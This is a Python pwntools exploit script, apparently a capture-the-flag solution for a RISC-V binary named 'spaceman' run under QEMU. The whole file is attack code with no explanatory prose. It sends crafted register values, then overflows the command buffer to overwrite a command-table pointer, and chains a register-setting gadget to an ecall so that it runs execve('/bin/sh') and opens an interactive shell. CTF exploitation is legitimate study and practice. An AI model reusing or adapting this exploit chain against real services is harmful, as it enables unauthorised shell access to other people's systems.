#!/usr/bin/env python3

from pwn import *

exe = ELF("./spaceman")

context.binary = exe

QEMU_PATH = "/opt/riscv/bin/qemu-riscv64"
GDB_SCRIPT = """
b *sys_run+218
c
"""

SYSCALL_EXECVE = 221

GADGET_SET_REGISTERS = 0x00029b46
# a2 78           c.ldsp     a7,0x28(sp)
# e2 65           c.ldsp     a1,0x18(sp)
# 02 75           c.ldsp     a0,0x20(sp)
# 42 63           c.ldsp     t1,0x10(sp)
# aa 70           c.ldsp     ra,0xa8(sp)
# ea 64           c.ldsp     s1,0x98(sp)
# 4a 69           c.ldsp     s2,0x90(sp)
# 46 7b           c.ldsp     s6,0x70(sp)
# e6 6c           c.ldsp     s9,0x58(sp)
# a6 6d           c.ldsp     s11,0x48(sp)
# e2 87           c.mv       a5,s8
# 06 7c           c.ldsp     s8,0x60(sp)
# 81 46           c.li       a3,0x0
# 01 46           c.li       a2,0x0
# 4d 61           c.addi16sp sp,0xb0
# 02 83           c.jr       t1

GADGET_ECALL = 0x0002475e
# 73 00 00 00     ecall

def conn():
    if args.LOCAL:
        r = process([QEMU_PATH, exe.path])
    elif args.GDB:
        r = process([QEMU_PATH, "-g", "1337", exe.path])
        sleep(1)
        gdb.attach(("localhost", 1337), exe=exe.path, gdbscript=GDB_SCRIPT)
    else:
        r = remote("addr", 1337)

    return r

def main():
    r = conn()

    r.recvuntil(b"LOGIN: ")

    registers = p64(0xABABABABABABABAB) # 0x00(sp)
    registers += p64(0xCDCDCDCDCDCDCDCD) # 0x08(sp)
    registers += p64(GADGET_ECALL) # 0x10(sp) => t1 => jump target
    registers += p64(0) # 0x18(sp) => a1
    registers += p64(exe.symbols.CMD_BUF) # 0x20(sp) => a0
    registers += p64(SYSCALL_EXECVE) # 0x28(sp) => a7 => syscall number
    r.sendline(registers)

    r.recvuntil(b"COMMAND> ")
    payload = b"/bin/sh\0" + b'A' * 0x8
    # overwrite the first entry in the command table to point to the command buffer.
    # this will send us to our gadget no matter what command we sent and leaves our shell string in the buffer
    payload += p64(exe.symbols.CMD_BUF) + p64(GADGET_SET_REGISTERS)
    r.sendline(payload)
    r.sendline(b"help")

    r.interactive()


if __name__ == "__main__":
    main()
